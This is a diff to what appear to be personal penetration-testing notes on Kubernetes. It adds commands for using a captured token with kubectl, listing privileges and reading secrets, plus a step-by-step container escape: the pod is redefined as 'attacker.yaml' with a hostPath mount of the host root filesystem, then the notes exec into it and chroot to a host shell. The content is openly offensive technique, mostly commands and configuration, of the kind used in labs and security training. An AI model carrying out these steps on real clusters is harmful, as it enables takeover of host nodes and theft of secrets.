@@ -363,6 +363,31 @@ Once you have it, run kubectl like:
 kubectl --token=$(cat token) --server=https://10.10.175.123:6443 --insecure-skip-tls-verify=true [commands]
 ```
 
-for commands, finding out what your privs are would be `can-i --list`. Others, like `get secrets -n [namespace]` etc.
+note the port of **6443**. has also been found as **16433**
+
+for commands, finding out what your privs are would be `auth can-i --list`. Others, like `get secrets -n [namespace]` etc.
 
 Hints from (along with more) this page https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration
+
+### Simple escape with full rights:
+
+- kubectl get pod <name> [-n <namespace>] -o yaml
+- mod with a new name, tag, and two volume changes:
+    
+    ```
+      volumes:
+      - name: host-fs
+        hostPath:
+          path: /
+    ```
+    
+    and under a container
+    
+    ```
+      volumeMounts:
+      - name: host-fs
+        mountPath: /root
+    ```
+- kubectl apply -f attacker.yaml [-n <namespace>]
+- kubectl exec -it attacker-pod [-n <namespace>] -- bash
+- chroot /root /bin/bash
